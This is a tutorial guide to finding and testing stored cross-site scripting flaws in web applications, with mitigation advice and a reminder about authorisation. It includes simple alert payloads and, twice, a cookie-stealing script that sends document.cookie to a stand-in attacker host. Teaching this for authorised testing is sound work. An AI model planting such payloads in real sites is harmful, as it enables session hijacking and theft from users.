
# Stored Cross Site Scripting (XSS) Guide
**Stored XSS** is often more severe than Reflected XSS because the malicious payload is stored on the server, potentially affecting many users who interact with the application. The attacker’s script could execute in the context of the user’s browser, allowing them to steal session cookies, deface content, or perform actions on behalf of the user.

### Steps to Perform Stored XSS

Here’s a detailed breakdown of how an attacker might exploit a Stored XSS vulnerability:

#### 1. **Identify Potential Injection Points**

1. **Explore Input Fields**: Look for places where user input is accepted and stored by the application. Common targets include:
   - **User Profile Fields**: Name, bio, website URL.
   - **Comment Sections**: Blog comments, forum posts.
   - **Feedback Forms**: Contact forms, survey responses.
   - **Message Boards**: Private messages, public posts.

2. **Check for Display Areas**: Determine where user inputs might be displayed later. This could be in user-generated content that gets rendered back to the user, such as:
   - **Public Pages**: Blogs, forum threads, comment sections.
   - **Admin Interfaces**: Content management systems (CMS), user management.

#### 2. **Test for Basic XSS Vulnerability**

1. **Inject Simple Scripts**: Test basic script payloads to see if they are reflected back and executed. Examples:
   ```html
   <script>alert('XSS')</script>
             OR
   <img src="x" onerror="alert('XSS')">
   ```

2. **Submit Payloads**: Enter these payloads into input fields or submit them through forms, then check if the script executes when you revisit the page or view the content.

#### 3. **Confirm Stored XSS**

1. **Check Persistence**: After submitting the payload, navigate to the page where the input is stored. Confirm that the payload is still there and executed when viewed by other users.

2. **Verify Across Sessions**: Ensure that the payload persists even after logging out and logging back in, or after other users access the content.

#### 4. **Extract Data (if applicable)**

1. **Use Data Theft Payloads**: If the goal is to steal data (e.g., session cookies), inject scripts that send data to an external server. For example:
   ```html
   <script>
   fetch('http://attacker.com/steal?cookie=' + document.cookie);
   </script>
   ```

2. **Monitor Data**: Use a server or tool to collect the stolen data and analyze it.

#### 5. **Exploit and Assess Impact**

1. **Test Broader Impacts**: Evaluate how the XSS vulnerability can be used to impact users. For example:
   - **Session Hijacking**: Stealing session cookies to impersonate users.
   - **Defacement**: Changing the content of a webpage to mislead users.
   - **Phishing**: Crafting a fake login form to capture user credentials.

2. **Document Findings**: Record details of the XSS vulnerability, including:
   - **Injection Points**: Where the payload was injected.
   - **Payloads Used**: The scripts or payloads that were successful.
   - **Impact**: The potential harm caused by the vulnerability.

3. **Prepare Recommendations**: Provide advice on mitigating Stored XSS vulnerabilities:
   - **Input Validation**: Ensure all user inputs are validated and sanitized before being stored or rendered.
   - **Output Encoding**: Encode output to prevent execution of potentially malicious code.
   - **Content Security Policy (CSP)**: Implement CSP to restrict the sources of executable scripts.

### Example Scenario: Testing a Comment Section

1. **Identify Injection Point**: Suppose there is a comment section on a blog post.

2. **Test for Basic XSS**: Submit a comment with a payload:
   ```html
   <script>alert('XSS')</script>
   ```

3. **Confirm Stored XSS**: Check if the script executes when viewing the comment on the blog post. Ensure that it persists and is visible to other users.

4. **Use Data Theft Payloads**: If the goal is to steal data:
   ```html
   <script>
   fetch('http://attacker.com/steal?cookie=' + document.cookie);
   </script>
   ```

5. **Document Findings**: Record the comment section’s URL, the payload used, and any data extracted.

### Conclusion

Stored XSS vulnerabilities allow attackers to inject and persist malicious scripts that are executed whenever users interact with the affected part of the application. Identifying and exploiting these vulnerabilities involves testing input points, confirming persistence, and assessing the potential impact. Mitigation involves proper input validation, output encoding, and implementing security policies to protect users and the application. 

Always ensure you have explicit permission to test for XSS vulnerabilities and adhere to ethical guidelines during your assessments.
